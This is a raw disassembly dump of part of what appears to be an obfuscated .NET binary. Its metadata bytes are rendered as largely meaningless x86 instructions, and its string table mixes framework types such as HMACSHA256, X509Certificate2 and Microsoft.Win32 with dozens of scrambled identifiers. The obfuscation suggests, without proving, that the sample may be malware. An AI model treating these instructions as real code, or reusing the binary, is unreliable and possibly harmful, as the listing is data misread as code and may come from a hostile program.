  407629:	08 7a 02             	or     %bh,0x2(%edx)
  40762c:	02 00                	add    (%eax),%al
  40762e:	06                   	push   %es
  40762f:	00 03                	add    %al,(%ebx)
  407631:	00 01                	add    %al,(%ecx)
  407633:	00 07                	add    %al,(%edi)
  407635:	00 03                	add    %al,(%ebx)
  407637:	00 02                	add    %al,(%edx)
  407639:	00 08                	add    %cl,(%eax)
  40763b:	00 05 00 01 00 09    	add    %al,0x9000100
  407641:	00 05 00 02 00 0a    	add    %al,0xa000200
  407647:	00 07                	add    %al,(%edi)
  407649:	00 01                	add    %al,(%ecx)
  40764b:	00 0b                	add    %cl,(%ebx)
  40764d:	00 07                	add    %al,(%edi)
  40764f:	00 02                	add    %al,(%edx)
  407651:	00 0c 00             	add    %cl,(%eax,%eax,1)
  407654:	09 00                	or     %eax,(%eax)
  407656:	01 00                	add    %eax,(%eax)
  407658:	0d 00 09 00 02       	or     $0x2000900,%eax
  40765d:	00 0e                	add    %cl,(%esi)
  40765f:	00 0b                	add    %cl,(%ebx)
  407661:	00 01                	add    %al,(%ecx)
  407663:	00 0f                	add    %cl,(%edi)
  407665:	00 0b                	add    %cl,(%ebx)
  407667:	00 02                	add    %al,(%edx)
  407669:	00 10                	add    %dl,(%eax)
  40766b:	00 0d 00 01 00 11    	add    %cl,0x11000100
  407671:	00 0d 00 02 00 12    	add    %cl,0x12000200
  407677:	00 0f                	add    %cl,(%edi)
  407679:	00 01                	add    %al,(%ecx)
  40767b:	00 13                	add    %dl,(%ebx)
  40767d:	00 0f                	add    %cl,(%edi)
  40767f:	00 02                	add    %al,(%edx)
  407681:	00 14 00             	add    %dl,(%eax,%eax,1)
  407684:	11 00                	adc    %eax,(%eax)
  407686:	02 00                	add    (%eax),%al
  407688:	15 00 13 00 01       	adc    $0x1001300,%eax
  40768d:	00 16                	add    %dl,(%esi)
  40768f:	00 13                	add    %dl,(%ebx)
  407691:	00 02                	add    %al,(%edx)
  407693:	00 17                	add    %dl,(%edi)
  407695:	00 15 00 01 00 18    	add    %dl,0x18000100
  40769b:	00 15 00 02 00 19    	add    %dl,0x19000200
  4076a1:	00 17                	add    %dl,(%edi)
  4076a3:	00 01                	add    %al,(%ecx)
  4076a5:	00 1a                	add    %bl,(%edx)
  4076a7:	00 17                	add    %dl,(%edi)
  4076a9:	00 02                	add    %al,(%edx)
  4076ab:	00 60 00             	add    %ah,0x0(%eax)
  4076ae:	19 00                	sbb    %eax,(%eax)
  4076b0:	02 00                	add    (%eax),%al
  4076b2:	68 00 1b 00 02       	push   $0x2001b00
  4076b7:	00 69 00             	add    %ch,0x0(%ecx)
  4076ba:	1d 00 02 00 8b       	sbb    $0x8b000200,%eax
  4076bf:	00 1f                	add    %bl,(%edi)
  4076c1:	00 01                	add    %al,(%ecx)
  4076c3:	00 8c 00 1f 00 02 00 	add    %cl,0x2001f(%eax,%eax,1)
  4076ca:	8d 00                	lea    (%eax),%eax
  4076cc:	21 00                	and    %eax,(%eax)
  4076ce:	01 00                	add    %eax,(%eax)
  4076d0:	8e 00                	mov    (%eax),%es
  4076d2:	21 00                	and    %eax,(%eax)
  4076d4:	02 00                	add    (%eax),%al
  4076d6:	8f 00                	pop    (%eax)
  4076d8:	23 00                	and    (%eax),%eax
  4076da:	01 00                	add    %eax,(%eax)
  4076dc:	90                   	nop
  4076dd:	00 23                	add    %ah,(%ebx)
  4076df:	00 02                	add    %al,(%edx)
  4076e1:	00 91 00 25 00 02    	add    %dl,0x2002500(%ecx)
  4076e7:	00 92 00 27 00 16    	add    %dl,0x16002700(%edx)
  4076ed:	00 c0                	add    %al,%al
  4076ef:	00 03                	add    %al,(%ebx)
  4076f1:	00 16                	add    %dl,(%esi)
  4076f3:	00 c2                	add    %al,%dl
  4076f5:	00 05 00 16 00 c4    	add    %al,0xc4001600
  4076fb:	00 07                	add    %al,(%edi)
  4076fd:	00 18                	add    %bl,(%eax)
  4076ff:	00 26                	add    %ah,(%esi)
  407701:	01 09                	add    %ecx,(%ecx)
  407703:	00 26                	add    %ah,(%esi)
  407705:	18 19                	sbb    %bl,(%ecx)
  407707:	18 31                	sbb    %dh,(%ecx)
  407709:	18 ef                	sbb    %ch,%bh
  40770b:	05 5b 06 75 06       	add    $0x675065b,%eax
  407710:	9c                   	pushf
  407711:	06                   	push   %es
  407712:	ff 06                	incl   (%esi)
  407714:	27                   	daa
  407715:	07                   	pop    %es
  407716:	00 01                	add    %al,(%ecx)
  407718:	71 00                	jno    0x40771a
  40771a:	f6 24 01             	mulb   (%ecx,%eax,1)
  40771d:	00 00                	add    %al,(%eax)
  40771f:	01 73 00             	add    %esi,0x0(%ebx)
  407722:	bc 23 01 00 00       	mov    $0x123,%esp
  407727:	01 75 00             	add    %esi,0x0(%ebp)
  40772a:	74 0e                	je     0x40773a
  40772c:	02 00                	add    (%eax),%al
  40772e:	41                   	inc    %ecx
  40772f:	01 77 00             	add    %esi,0x0(%edi)
  407732:	00 23                	add    %ah,(%ebx)
  407734:	02 00                	add    (%eax),%al
  407736:	40                   	inc    %eax
  407737:	01 79 00             	add    %edi,0x0(%ecx)
  40773a:	6a 10                	push   $0x10
  40773c:	02 00                	add    (%eax),%al
  40773e:	40                   	inc    %eax
  40773f:	01 7b 00             	add    %edi,0x0(%ebx)
  407742:	9e                   	sahf
  407743:	17                   	pop    %ss
  407744:	03 00                	add    (%eax),%eax
  407746:	50                   	push   %eax
  407747:	20 00                	and    %al,(%eax)
  407749:	00 2d 00 70 20 00    	add    %ch,0x207000
  40774f:	00 47 00             	add    %al,0x0(%edi)
  407752:	04 80                	add    $0x80,%al
  407754:	00 00                	add    %al,(%eax)
  407756:	01 00                	add    %eax,(%eax)
	...
  407764:	fb                   	sti
  407765:	23 00                	and    (%eax),%eax
  407767:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  407772:	00 00                	add    %al,(%eax)
  407774:	01 00                	add    %eax,(%eax)
  407776:	ae                   	scas   %es:(%edi),%al
  407777:	0a 00                	or     (%eax),%al
  407779:	00 00                	add    %al,(%eax)
  40777b:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  407786:	00 00                	add    %al,(%eax)
  407788:	01 00                	add    %eax,(%eax)
  40778a:	df 18                	fistps (%eax)
  40778c:	00 00                	add    %al,(%eax)
  40778e:	00 00                	add    %al,(%eax)
  407790:	04 00                	add    $0x0,%al
	...
  40779a:	00 00                	add    %al,(%eax)
  40779c:	cc                   	int3
  40779d:	00 fd                	add    %bh,%ch
  40779f:	14 00                	adc    $0x0,%al
  4077a1:	00 00                	add    %al,(%eax)
  4077a3:	00 04 00             	add    %al,(%eax,%eax,1)
  4077a6:	00 00                	add    %al,(%eax)
  4077a8:	00 00                	add    %al,(%eax)
  4077aa:	00 00                	add    %al,(%eax)
  4077ac:	70 00                	jo     0x4077ae
  4077ae:	00 00                	add    %al,(%eax)
  4077b0:	01 00                	add    %eax,(%eax)
  4077b2:	28 10                	sub    %dl,(%eax)
  4077b4:	00 00                	add    %al,(%eax)
  4077b6:	00 00                	add    %al,(%eax)
  4077b8:	0a 00                	or     (%eax),%al
	...
  4077c2:	00 00                	add    %al,(%eax)
  4077c4:	cc                   	int3
  4077c5:	00 08                	add    %cl,(%eax)
  4077c7:	0b 00                	or     (%eax),%eax
  4077c9:	00 00                	add    %al,(%eax)
  4077cb:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4077d6:	00 00                	add    %al,(%eax)
  4077d8:	cc                   	int3
  4077d9:	00 ac 22 00 00 00 00 	add    %ch,0x0(%edx,%eiz,1)
  4077e0:	04 00                	add    $0x0,%al
	...
  4077ea:	00 00                	add    %al,(%eax)
  4077ec:	01 00                	add    %eax,(%eax)
  4077ee:	7a 20                	jp     0x407810
  4077f0:	00 00                	add    %al,(%eax)
  4077f2:	00 00                	add    %al,(%eax)
  4077f4:	04 00                	add    $0x0,%al
  4077f6:	00 00                	add    %al,(%eax)
  4077f8:	00 00                	add    %al,(%eax)
  4077fa:	00 00                	add    %al,(%eax)
  4077fc:	70 00                	jo     0x4077fe
  4077fe:	00 00                	add    %al,(%eax)
  407800:	cc                   	int3
  407801:	00 28                	add    %ch,(%eax)
  407803:	1c 00                	sbb    $0x0,%al
  407805:	00 00                	add    %al,(%eax)
  407807:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40780a:	0b 00                	or     (%eax),%eax
  40780c:	10 00                	adc    %al,(%eax)
  40780e:	0f 00 14 00          	lldt   (%eax,%eax,1)
  407812:	13 00                	adc    (%eax),%eax
  407814:	1e                   	push   %ds
  407815:	00 1d 00 75 01 8d    	add    %bl,0x8d017500
  40781b:	06                   	push   %es
  40781c:	00 41 63             	add    %al,0x63(%ecx)
  40781f:	74 69                	je     0x40788a
  407821:	6f                   	outsl  %ds:(%esi),(%dx)
  407822:	6e                   	outsb  %ds:(%esi),(%dx)
  407823:	60                   	pusha
  407824:	31 30                	xor    %esi,(%eax)
  407826:	00 49 45             	add    %cl,0x45(%ecx)
  407829:	6e                   	outsb  %ds:(%esi),(%dx)
  40782a:	75 6d                	jne    0x407899
  40782c:	65 72 61             	gs jb  0x407890
  40782f:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  407833:	31 00                	xor    %eax,(%eax)
  407835:	43                   	inc    %ebx
  407836:	61                   	popa
  407837:	6c                   	insb   (%dx),%es:(%edi)
  407838:	6c                   	insb   (%dx),%es:(%edi)
  407839:	53                   	push   %ebx
  40783a:	69 74 65 60 31 00 4c 	imul   $0x694c0031,0x60(%ebp,%eiz,2),%esi
  407841:	69 
  407842:	73 74                	jae    0x4078b8
  407844:	60                   	pusha
  407845:	31 00                	xor    %eax,(%eax)
  407847:	4d                   	dec    %ebp
  407848:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  40784f:	74 2e                	je     0x40787f
  407851:	57                   	push   %edi
  407852:	69 6e 33 32 00 54 6f 	imul   $0x6f540032,0x33(%esi),%ebp
  407859:	55                   	push   %ebp
  40785a:	49                   	dec    %ecx
  40785b:	6e                   	outsb  %ds:(%esi),(%dx)
  40785c:	74 33                	je     0x407891
  40785e:	32 00                	xor    (%eax),%al
  407860:	54                   	push   %esp
  407861:	6f                   	outsl  %ds:(%esi),(%dx)
  407862:	49                   	dec    %ecx
  407863:	6e                   	outsb  %ds:(%esi),(%dx)
  407864:	74 33                	je     0x407899
  407866:	32 00                	xor    (%eax),%al
  407868:	58                   	pop    %eax
  407869:	35 30 39 43 65       	xor    $0x65433930,%eax
  40786e:	72 74                	jb     0x4078e4
  407870:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  407877:	32 00                	xor    (%eax),%al
  407879:	54                   	push   %esp
  40787a:	6f                   	outsl  %ds:(%esi),(%dx)
  40787b:	55                   	push   %ebp
  40787c:	49                   	dec    %ecx
  40787d:	6e                   	outsb  %ds:(%esi),(%dx)
  40787e:	74 36                	je     0x4078b6
  407880:	34 00                	xor    $0x0,%al
  407882:	54                   	push   %esp
  407883:	6f                   	outsl  %ds:(%esi),(%dx)
  407884:	49                   	dec    %ecx
  407885:	6e                   	outsb  %ds:(%esi),(%dx)
  407886:	74 36                	je     0x4078be
  407888:	34 00                	xor    $0x0,%al
  40788a:	54                   	push   %esp
  40788b:	6f                   	outsl  %ds:(%esi),(%dx)
  40788c:	55                   	push   %ebp
  40788d:	49                   	dec    %ecx
  40788e:	6e                   	outsb  %ds:(%esi),(%dx)
  40788f:	74 31                	je     0x4078c2
  407891:	36 00 54 6f 49       	add    %dl,%ss:0x49(%edi,%ebp,2)
  407896:	6e                   	outsb  %ds:(%esi),(%dx)
  407897:	74 31                	je     0x4078ca
  407899:	36 00 48 4d          	add    %cl,%ss:0x4d(%eax)
  40789d:	41                   	inc    %ecx
  40789e:	43                   	inc    %ebx
  40789f:	53                   	push   %ebx
  4078a0:	48                   	dec    %eax
  4078a1:	41                   	inc    %ecx
  4078a2:	32 35 36 00 67 65    	xor    0x65670036,%dh
  4078a8:	74 5f                	je     0x407909
  4078aa:	55                   	push   %ebp
  4078ab:	54                   	push   %esp
  4078ac:	46                   	inc    %esi
  4078ad:	38 00                	cmp    %al,(%eax)
  4078af:	3c 4d                	cmp    $0x4d,%al
  4078b1:	6f                   	outsl  %ds:(%esi),(%dx)
  4078b2:	64 75 6c             	fs jne 0x407921
  4078b5:	65 3e 00 55 69       	gs add %dl,%ds:0x69(%ebp)
  4078ba:	57                   	push   %edi
  4078bb:	65 53                	gs push %ebx
  4078bd:	50                   	push   %eax
  4078be:	53                   	push   %ebx
  4078bf:	53                   	push   %ebx
  4078c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4078c1:	56                   	push   %esi
  4078c2:	68 45 41 00 67       	push   $0x67004145
  4078c7:	78 6a                	js     0x407933
  4078c9:	6d                   	insl   (%dx),%es:(%edi)
  4078ca:	48                   	dec    %eax
  4078cb:	44                   	inc    %esp
  4078cc:	64 78 68             	fs js  0x407937
  4078cf:	47                   	inc    %edi
  4078d0:	48                   	dec    %eax
  4078d1:	41                   	inc    %ecx
  4078d2:	00 79 4a             	add    %bh,0x4a(%ecx)
  4078d5:	6e                   	outsb  %ds:(%esi),(%dx)
  4078d6:	4b                   	dec    %ebx
  4078d7:	75 4e                	jne    0x407927
  4078d9:	43                   	inc    %ebx
  4078da:	50                   	push   %eax
  4078db:	48                   	dec    %eax
  4078dc:	41                   	inc    %ecx
  4078dd:	00 69 67             	add    %ch,0x67(%ecx)
  4078e0:	54                   	push   %esp
  4078e1:	6b 6e 75 4a          	imul   $0x4a,0x75(%esi),%ebp
  4078e5:	64 48                	fs dec %eax
  4078e7:	4f                   	dec    %edi
  4078e8:	49                   	dec    %ecx
  4078e9:	41                   	inc    %ecx
  4078ea:	00 54 54 48          	add    %dl,0x48(%esp,%edx,2)
  4078ee:	78 4d                	js     0x40793d
  4078f0:	62 75 53             	bound  %esi,0x53(%ebp)
  4078f3:	77 65                	ja     0x40795a
  4078f5:	51                   	push   %ecx
  4078f6:	4d                   	dec    %ebp
  4078f7:	74 4a                	je     0x407943
  4078f9:	41                   	inc    %ecx
  4078fa:	00 4e 58             	add    %cl,0x58(%esi)
  4078fd:	49                   	dec    %ecx
  4078fe:	64 77 41             	fs ja  0x407942
  407901:	54                   	push   %esp
  407902:	58                   	pop    %eax
  407903:	68 54 41 00 65       	push   $0x65004154
  407908:	57                   	push   %edi
  407909:	53                   	push   %ebx
  40790a:	55                   	push   %ebp
  40790b:	6f                   	outsl  %ds:(%esi),(%dx)
  40790c:	47                   	inc    %edi
  40790d:	6a 67                	push   $0x67
  40790f:	61                   	popa
  407910:	6e                   	outsb  %ds:(%esi),(%dx)
  407911:	4a                   	dec    %edx
  407912:	72 55                	jb     0x407969
  407914:	41                   	inc    %ecx
  407915:	00 48 6b             	add    %cl,0x6b(%eax)
  407918:	49                   	dec    %ecx
  407919:	54                   	push   %esp
  40791a:	6d                   	insl   (%dx),%es:(%edi)
  40791b:	4c                   	dec    %esp
  40791c:	71 72                	jno    0x407990
  40791e:	69 49 6c 6a 41 00 41 	imul   $0x4100416a,0x6c(%ecx),%ecx
  407925:	63 56 6c             	arpl   %edx,0x6c(%esi)
  407928:	54                   	push   %esp
  407929:	68 75 6f 55 53       	push   $0x53556f75
  40792e:	73 41                	jae    0x407971
  407930:	00 72 45             	add    %dh,0x45(%edx)
  407933:	63 73 6c             	arpl   %esi,0x6c(%ebx)
  407936:	42                   	inc    %edx
  407937:	56                   	push   %esi
  407938:	67 67 65 6f          	addr16 outsl %gs:(%si),(%dx)
  40793c:	55                   	push   %ebp
  40793d:	41                   	inc    %ecx
  40793e:	42                   	inc    %edx
  40793f:	00 64 4e 56          	add    %ah,0x56(%esi,%ecx,2)
  407943:	75 45                	jne    0x40798a
  407945:	47                   	inc    %edi
  407946:	72 73                	jb     0x4079bb
  407948:	65 4a                	gs dec %edx
  40794a:	42                   	inc    %edx
  40794b:	00 79 73             	add    %bh,0x73(%ecx)
  40794e:	66 64 45             	fs inc %bp
  407951:	7a 76                	jp     0x4079c9
  407953:	49                   	dec    %ecx
  407954:	49                   	dec    %ecx
  407955:	4c                   	dec    %esp
  407956:	42                   	inc    %edx
  407957:	00 73 51             	add    %dh,0x51(%ebx)
  40795a:	65 55                	gs push %ebp
  40795c:	65 57                	gs push %edi
  40795e:	45                   	inc    %ebp
  40795f:	47                   	inc    %edi
  407960:	65 67 4c             	gs addr16 dec %esp
  407963:	52                   	push   %edx
  407964:	42                   	inc    %edx
  407965:	00 68 52             	add    %ch,0x52(%eax)
  407968:	43                   	inc    %ebx
  407969:	4a                   	dec    %edx
  40796a:	5a                   	pop    %edx
  40796b:	69 7a 50 55 53 42 00 	imul   $0x425355,0x50(%edx),%edi
  407972:	72 70                	jb     0x4079e4
  407974:	78 74                	js     0x4079ea
  407976:	5a                   	pop    %edx
  407977:	7a 78                	jp     0x4079f1
  407979:	6a 67                	push   $0x67
  40797b:	59                   	pop    %ecx
  40797c:	56                   	push   %esi
  40797d:	41                   	inc    %ecx
  40797e:	66 42                	inc    %dx
  407980:	00 41 48             	add    %al,0x48(%ecx)
  407983:	4f                   	dec    %edi
  407984:	41                   	inc    %ecx
  407985:	6a 6b                	push   $0x6b
  407987:	78 62                	js     0x4079eb
  407989:	76 42                	jbe    0x4079cd
  40798b:	00 47 43             	add    %al,0x43(%edi)
  40798e:	00 6e 72             	add    %ch,0x72(%esi)
  407991:	6b 46 4b 73          	imul   $0x73,0x4b(%esi),%eax
  407995:	76 66                	jbe    0x4079fd
  407997:	4f                   	dec    %edi
  407998:	73 49                	jae    0x4079e3
  40799a:	43                   	inc    %ebx
  40799b:	00 46 5a             	add    %al,0x5a(%esi)
  40799e:	52                   	push   %edx
  40799f:	7a 41                	jp     0x4079e2
  4079a1:	74 6d                	je     0x407a10
  4079a3:	4f                   	dec    %edi
  4079a4:	70 4b                	jo     0x4079f1
  4079a6:	4e                   	dec    %esi
  4079a7:	68 4a 43 00 4e       	push   $0x4e00434a
  4079ac:	46                   	inc    %esi
  4079ad:	4d                   	dec    %ebp
  4079ae:	54                   	push   %esp
  4079af:	6f                   	outsl  %ds:(%esi),(%dx)
  4079b0:	75 68                	jne    0x407a1a
  4079b2:	61                   	popa
  4079b3:	6b 7a 69 68          	imul   $0x68,0x69(%edx),%edi
  4079b7:	4c                   	dec    %esp
  4079b8:	43                   	inc    %ebx
  4079b9:	00 74 41 47          	add    %dh,0x47(%ecx,%eax,2)
  4079bd:	74 42                	je     0x407a01
  4079bf:	47                   	inc    %edi
  4079c0:	4a                   	dec    %edx
  4079c1:	50                   	push   %eax
  4079c2:	49                   	dec    %ecx
  4079c3:	51                   	push   %ecx
  4079c4:	4b                   	dec    %ebx
  4079c5:	48                   	dec    %eax
  4079c6:	4e                   	dec    %esi
  4079c7:	43                   	inc    %ebx
  4079c8:	00 54 45 53          	add    %dl,0x53(%ebp,%eax,2)
  4079cc:	63 48 66             	arpl   %ecx,0x66(%eax)
  4079cf:	41                   	inc    %ecx
  4079d0:	51                   	push   %ecx
  4079d1:	5a                   	pop    %edx
  4079d2:	66 54                	push   %sp
  4079d4:	54                   	push   %esp
  4079d5:	51                   	push   %ecx
  4079d6:	43                   	inc    %ebx
  4079d7:	00 72 41             	add    %dh,0x41(%edx)
  4079da:	52                   	push   %edx
  4079db:	4d                   	dec    %ebp
  4079dc:	71 66                	jno    0x407a44
  4079de:	53                   	push   %ebx
  4079df:	52                   	push   %edx
  4079e0:	51                   	push   %ecx
  4079e1:	63 77 48             	arpl   %esi,0x48(%edi)
  4079e4:	6b 4f 52 43          	imul   $0x43,0x52(%edi),%ecx
  4079e8:	00 74 72 56          	add    %dh,0x56(%edx,%esi,2)
  4079ec:	63 6e 46             	arpl   %ebp,0x46(%esi)
  4079ef:	49                   	dec    %ecx
  4079f0:	59                   	pop    %ecx
  4079f1:	68 41 53 43 00       	push   $0x435341
  4079f6:	4c                   	dec    %esp
  4079f7:	72 63                	jb     0x407a5c
  4079f9:	59                   	pop    %ecx
  4079fa:	59                   	pop    %ecx
  4079fb:	49                   	dec    %ecx
  4079fc:	4a                   	dec    %edx
  4079fd:	5a                   	pop    %edx
  4079fe:	54                   	push   %esp
  4079ff:	6b 4a 55 43          	imul   $0x43,0x55(%edx),%ecx
  407a03:	00 65 57             	add    %ah,0x57(%ebp)
  407a06:	75 53                	jne    0x407a5b
  407a08:	6a 68                	push   $0x68
  407a0a:	61                   	popa
  407a0b:	69 6f 62 43 00 63 68 	imul   $0x68630043,0x62(%edi),%ebp
  407a12:	67 47                	addr16 inc %edi
  407a14:	45                   	inc    %ebp
  407a15:	43                   	inc    %ebx
  407a16:	64 64 46             	fs fs inc %esi
  407a19:	5a                   	pop    %edx
  407a1a:	6f                   	outsl  %ds:(%esi),(%dx)
  407a1b:	70 43                	jo     0x407a60
  407a1d:	00 6a 50             	add    %ch,0x50(%edx)
  407a20:	69 43 6d 61 64 4e 6e 	imul   $0x6e4e6461,0x6d(%ebx),%eax
  407a27:	43                   	inc    %ebx
  407a28:	4a                   	dec    %edx
  407a29:	67 74 43             	addr16 je 0x407a6f
  407a2c:	00 45 44             	add    %al,0x44(%ebp)
  407a2f:	56                   	push   %esi
  407a30:	79 47                	jns    0x407a79
  407a32:	43                   	inc    %ebx
  407a33:	75 59                	jne    0x407a8e
  407a35:	70 58                	jo     0x407a8f
  407a37:	45                   	inc    %ebp
  407a38:	4f                   	dec    %edi
  407a39:	69 68 42 44 00 4d 61 	imul   $0x614d0044,0x42(%eax),%ebp
  407a40:	70 4e                	jo     0x407a90
  407a42:	61                   	popa
  407a43:	6d                   	insl   (%dx),%es:(%edi)
  407a44:	65 54                	gs push %esp
  407a46:	6f                   	outsl  %ds:(%esi),(%dx)
  407a47:	4f                   	dec    %edi
  407a48:	49                   	dec    %ecx
  407a49:	44                   	inc    %esp
  407a4a:	00 67 65             	add    %ah,0x65(%edi)
  407a4d:	74 5f                	je     0x407aae
  407a4f:	46                   	inc    %esi
  407a50:	6f                   	outsl  %ds:(%esi),(%dx)
  407a51:	72 6d                	jb     0x407ac0
  407a53:	61                   	popa
  407a54:	74 49                	je     0x407a9f
  407a56:	44                   	inc    %esp
  407a57:	00 66 6d             	add    %ah,0x6d(%esi)
  407a5a:	4d                   	dec    %ebp
  407a5b:	4f                   	dec    %edi
  407a5c:	4b                   	dec    %ebx
  407a5d:	43                   	inc    %ebx
  407a5e:	41                   	inc    %ecx
  407a5f:	69 72 74 6f 4d 44 00 	imul   $0x444d6f,0x74(%edx),%esi
  407a66:	47                   	inc    %edi
  407a67:	4e                   	dec    %esi
  407a68:	63 6e 55             	arpl   %ebp,0x55(%esi)
  407a6b:	55                   	push   %ebp
  407a6c:	51                   	push   %ecx
  407a6d:	4c                   	dec    %esp
  407a6e:	4f                   	dec    %edi
  407a6f:	4c                   	dec    %esp
  407a70:	6d                   	insl   (%dx),%es:(%edi)
  407a71:	58                   	pop    %eax
  407a72:	4f                   	dec    %edi
  407a73:	50                   	push   %eax
  407a74:	44                   	inc    %esp
  407a75:	00 62 45             	add    %ah,0x45(%edx)
  407a78:	73 4c                	jae    0x407ac6
  407a7a:	4d                   	dec    %ebp
  407a7b:	51                   	push   %ecx
  407a7c:	4d                   	dec    %ebp
  407a7d:	7a 68                	jp     0x407ae7
  407a7f:	49                   	dec    %ecx
  407a80:	6e                   	outsb  %ds:(%esi),(%dx)
  407a81:	6f                   	outsl  %ds:(%esi),(%dx)
  407a82:	77 56                	ja     0x407ada
  407a84:	44                   	inc    %esp
  407a85:	00 61 74             	add    %ah,0x74(%ecx)
  407a88:	48                   	dec    %eax
  407a89:	55                   	push   %ebp
  407a8a:	58                   	pop    %eax
  407a8b:	47                   	inc    %edi
  407a8c:	63 4e 6a             	arpl   %ecx,0x6a(%esi)
  407a8f:	50                   	push   %eax
  407a90:	72 4d                	jb     0x407adf
  407a92:	6c                   	insb   (%dx),%es:(%edi)
  407a93:	44                   	inc    %esp
  407a94:	00 50 4c             	add    %dl,0x4c(%eax)
  407a97:	4c                   	dec    %esp
  407a98:	73 6a                	jae    0x407b04
  407a9a:	56                   	push   %esi
  407a9b:	4e                   	dec    %esi
  407a9c:	72 7a                	jb     0x407b18
  407a9e:	78 44                	js     0x407ae4
  407aa0:	00 48 43             	add    %cl,0x43(%eax)
  407aa3:	56                   	push   %esi
  407aa4:	41                   	inc    %ecx
  407aa5:	6e                   	outsb  %ds:(%esi),(%dx)
  407aa6:	76 44                	jbe    0x407aec
  407aa8:	41                   	inc    %ecx
  407aa9:	42                   	inc    %edx
  407aaa:	6b 47 41 6f          	imul   $0x6f,0x41(%edi),%eax
  407aae:	45                   	inc    %ebp
  407aaf:	45                   	inc    %ebp
  407ab0:	00 79 43             	add    %bh,0x43(%ecx)
  407ab3:	72 6f                	jb     0x407b24
  407ab5:	62 55 41             	bound  %edx,0x41(%ebp)
  407ab8:	6b 48 74 67          	imul   $0x67,0x74(%eax),%ecx
  407abc:	46                   	inc    %esi
  407abd:	45                   	inc    %ebp
  407abe:	00 6b 6a             	add    %ch,0x6a(%ebx)
  407ac1:	50                   	push   %eax
  407ac2:	6c                   	insb   (%dx),%es:(%edi)
  407ac3:	44                   	inc    %esp
  407ac4:	69 5a 45 4d 51 49 45 	imul   $0x4549514d,0x45(%edx),%ebx
  407acb:	00 6e 6c             	add    %ch,0x6c(%esi)
  407ace:	49                   	dec    %ecx
  407acf:	45                   	inc    %ebp
  407ad0:	66 59                	pop    %cx
  407ad2:	44                   	inc    %esp
  407ad3:	43                   	inc    %ebx
  407ad4:	59                   	pop    %ecx
  407ad5:	54                   	push   %esp
  407ad6:	44                   	inc    %esp
  407ad7:	43                   	inc    %ebx
  407ad8:	58                   	pop    %eax
  407ad9:	46                   	inc    %esi
  407ada:	50                   	push   %eax
  407adb:	45                   	inc    %ebp
  407adc:	00 6b 6e             	add    %ch,0x6e(%ebx)
  407adf:	6f                   	outsl  %ds:(%esi),(%dx)
  407ae0:	72 44                	jb     0x407b26
  407ae2:	4f                   	dec    %edi
  407ae3:	75 72                	jne    0x407b57
  407ae5:	63 4e 61             	arpl   %ecx,0x61(%esi)
  407ae8:	45                   	inc    %ebp
  407ae9:	00 75 58             	add    %dh,0x58(%ebp)
  407aec:	72 52                	jb     0x407b40
  407aee:	6c                   	insb   (%dx),%es:(%edi)
  407aef:	61                   	popa
  407af0:	43                   	inc    %ebx
  407af1:	56                   	push   %esi
  407af2:	64 45                	fs inc %ebp
  407af4:	00 68 67             	add    %ch,0x67(%eax)
  407af7:	75 71                	jne    0x407b6a
  407af9:	66 7a 53             	data16 jp 0x407b4f
  407afc:	48                   	dec    %eax
  407afd:	53                   	push   %ebx
  407afe:	65 45                	gs inc %ebp
  407b00:	00 44 69 46          	add    %al,0x46(%ecx,%ebp,2)
  407b04:	76 77                	jbe    0x407b7d
  407b06:	55                   	push   %ebp
  407b07:	57                   	push   %edi
  407b08:	62 77 45             	bound  %esi,0x45(%edi)
  407b0b:	00 4e 45             	add    %cl,0x45(%esi)
  407b0e:	6a 4f                	push   $0x4f
  407b10:	6f                   	outsl  %ds:(%esi),(%dx)
  407b11:	42                   	inc    %edx
  407b12:	72 51                	jb     0x407b65
  407b14:	52                   	push   %edx
  407b15:	66 41                	inc    %cx
  407b17:	4a                   	dec    %edx
  407b18:	58                   	pop    %eax
  407b19:	4e                   	dec    %esi
  407b1a:	46                   	inc    %esi
  407b1b:	00 52 74             	add    %dl,0x74(%edx)
  407b1e:	5a                   	pop    %edx
  407b1f:	6f                   	outsl  %ds:(%esi),(%dx)
  407b20:	55                   	push   %ebp
  407b21:	44                   	inc    %esp
  407b22:	50                   	push   %eax
  407b23:	59                   	pop    %ecx
  407b24:	70 55                	jo     0x407b7b
  407b26:	66 53                	push   %bx
  407b28:	46                   	inc    %esi
  407b29:	00 4d 55             	add    %cl,0x55(%ebp)
  407b2c:	57                   	push   %edi
  407b2d:	5a                   	pop    %edx
  407b2e:	64 41                	fs inc %ecx
  407b30:	70 68                	jo     0x407b9a
  407b32:	44                   	inc    %esp
  407b33:	63 43 65             	arpl   %eax,0x65(%ebx)
  407b36:	51                   	push   %ecx
  407b37:	52                   	push   %edx
  407b38:	54                   	push   %esp
  407b39:	46                   	inc    %esi
  407b3a:	00 50 46             	add    %dl,0x46(%eax)
  407b3d:	54                   	push   %esp
  407b3e:	70 71                	jo     0x407bb1
  407b40:	49                   	dec    %ecx
  407b41:	42                   	inc    %edx
  407b42:	77 52                	ja     0x407b96
  407b44:	6e                   	outsb  %ds:(%esi),(%dx)
  407b45:	44                   	inc    %esp
  407b46:	57                   	push   %edi
  407b47:	46                   	inc    %esi
  407b48:	00 54 78 77          	add    %dl,0x77(%eax,%edi,2)
  407b4c:	68 4d 6c 62 74       	push   $0x74626c4d
  407b51:	64 67 6b 68 62 46    	imul   $0x46,%fs:0x62(%bx,%si),%ebp
  407b57:	00 55 64             	add    %dl,0x64(%ebp)
  407b5a:	62 52 6a             	bound  %edx,0x6a(%edx)
  407b5d:	55                   	push   %ebp
  407b5e:	43                   	inc    %ebx
  407b5f:	72 57                	jb     0x407bb8
  407b61:	42                   	inc    %edx
  407b62:	45                   	inc    %ebp
  407b63:	67 46                	addr16 inc %esi
  407b65:	00 78 46             	add    %bh,0x46(%eax)
  407b68:	48                   	dec    %eax
  407b69:	41                   	inc    %ecx
  407b6a:	78 75                	js     0x407be1
  407b6c:	72 6b                	jb     0x407bd9
  407b6e:	49                   	dec    %ecx
  407b6f:	70 48                	jo     0x407bb9
  407b71:	6a 46                	push   $0x46
  407b73:	00 6d 52             	add    %ch,0x52(%ebp)
  407b76:	4d                   	dec    %ebp
  407b77:	7a 4d                	jp     0x407bc6
  407b79:	50                   	push   %eax
